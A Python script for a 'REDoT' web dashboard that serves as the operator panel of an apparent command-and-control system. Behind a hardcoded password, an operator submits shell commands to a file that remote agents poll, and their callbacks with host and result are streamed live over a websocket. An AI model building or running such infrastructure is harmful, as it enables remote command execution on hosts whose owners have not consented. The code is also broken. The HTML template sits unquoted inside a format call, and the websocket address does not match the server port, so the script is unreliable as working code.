
#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import socketserver, threading, os, json
from websocket_server import WebsocketServer

AUTH_PASSWORD = "redot123"
CMD_FILE = "results/current_command.txt"
LOG_FILE = "results/agent_callbacks.log"
HTML_FILE = "dashboard.html"
clients = []

def notify_all(msg):
    for client in clients:
        server.send_message(client, json.dumps(msg))

class DashboardHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            try:
                with open(HTML_FILE) as f:
                    html = f.read()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(html.encode())
            except:
                self.send_error(500)
        else:
            self.send_error(404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode()
        fields = parse_qs(data)
        if self.path == "/auth":
            if fields.get("pw", [""])[0] == AUTH_PASSWORD:
                self.send_response(200)
            else:
                self.send_response(403)
            self.end_headers()
        elif self.path == "/send":
            cmd = fields.get("cmd", [""])[0]
            with open(CMD_FILE, "w") as f:
                f.write(cmd.strip())
            self.send_response(200)
            self.end_headers()
        else:
            self.send_error(404)

class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer): pass

def websocket_cb(client, server, message): pass

def websocket_new(client, server): clients.append(client)

def websocket_close(client, server): clients.remove(client)

def watch_callbacks():
    seen = set()
    while True:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                lines = f.readlines()
            for line in lines:
                if line not in seen:
                    seen.add(line)
                    try:
                        obj = json.loads(line.strip())
                        notify_all(obj)
                    except:
                        pass
        time.sleep(2)

def run_all():
    os.makedirs("results", exist_ok=True)
    if not os.path.exists(HTML_FILE):
        with open(HTML_FILE, "w") as f:
            f.write("""{}""".format(\n<!DOCTYPE html>\n<html>\n<head>\n  <title>REDoT Web Dashboard</title>\n  <style>\n    body { background: #0f0f0f; color: #39ff14; font-family: monospace; padding: 20px; }\n    h1, h2 { color: #00ffff; }\n    .agent { margin: 5px 0; padding: 5px; border-bottom: 1px solid #00ffff; }\n    .login { color: white; }\n    input, button { font-family: monospace; background: black; color: #39ff14; border: 1px solid #00ffff; padding: 5px; }\n    textarea { width: 100%; height: 100px; background: black; color: #39ff14; border: 1px solid #00ffff; }\n  </style>\n</head>\n<body>\n  <h1>REDoT Live Dashboard</h1>\n  <div id="loginForm">\n    <p class="login">Password: <input type="password" id="pw"><button onclick="login()">Login</button></p>\n  </div>\n  <div id="main" style="display:none">\n    <h2>Send Command</h2>\n    <input type="text" id="cmd" placeholder="e.g. uname -a"><button onclick="sendCommand()">Send</button>\n    <h2>Live Callbacks</h2>\n    <label>Filter by Agent:</label>\n    <input type="text" id="filter" oninput="filterLogs()">\n    <div id="logs"></div>\n  </div>\n\n  <script>\n    let ws, logs = [];\n    function login() {\n      const pw = document.getElementById(\'pw\').value;\n      fetch(\'/auth\', {\n        method: \'POST\',\n        headers: { \'Content-Type\': \'application/x-www-form-urlencoded\' },\n        body: \'pw=\' + encodeURIComponent(pw)\n      }).then(r => {\n        if (r.status == 200) {\n          document.getElementById(\'loginForm\').style.display = \'none\';\n          document.getElementById(\'main\').style.display = \'block\';\n          connectWebSocket();\n        } else {\n          alert(\'Access denied\');\n        }\n      });\n    }\n\n    function connectWebSocket() {\n      ws = new WebSocket("ws://" + location.host + "/ws");\n      ws.onmessage = function(event) {\n        let data = JSON.parse(event.data);\n        logs.push(data);\n        updateLogs();\n      };\n    }\n\n    function updateLogs() {\n      const filter = document.getElementById(\'filter\').value.toLowerCase();\n      const div = document.getElementById(\'logs\');\n      div.innerHTML = \'\';\n      logs.filter(e => !filter || (e.host || \'\').toLowerCase().includes(filter)).forEach(e => {\n        let el = document.createElement(\'div\');\n        el.className = \'agent\';\n        el.textContent = `[${e.host}] → ${e.result}`;\n        div.appendChild(el);\n      });\n    }\n\n    function filterLogs() {\n      updateLogs();\n    }\n\n    function sendCommand() {\n      const cmd = document.getElementById(\'cmd\').value;\n      fetch(\'/send\', {\n        method: \'POST\',\n        headers: { \'Content-Type\': \'application/x-www-form-urlencoded\' },\n        body: \'cmd=\' + encodeURIComponent(cmd)\n      });\n    }\n  </script>\n</body>\n</html>\n))
    with open(CMD_FILE, "w") as f:
        f.write("")

    threading.Thread(target=watch_callbacks, daemon=True).start()

    server_thread = threading.Thread(target=lambda: ThreadedHTTPServer(('0.0.0.0', 8080), DashboardHandler).serve_forever())
    server_thread.daemon = True
    server_thread.start()

    global server
    server = WebsocketServer(8765, host='0.0.0.0')
    server.set_fn_new_client(websocket_new)
    server.set_fn_client_left(websocket_close)
    server.set_fn_message_received(websocket_cb)
    server.run_forever()

if __name__ == "__main__":
    import time
    run_all()
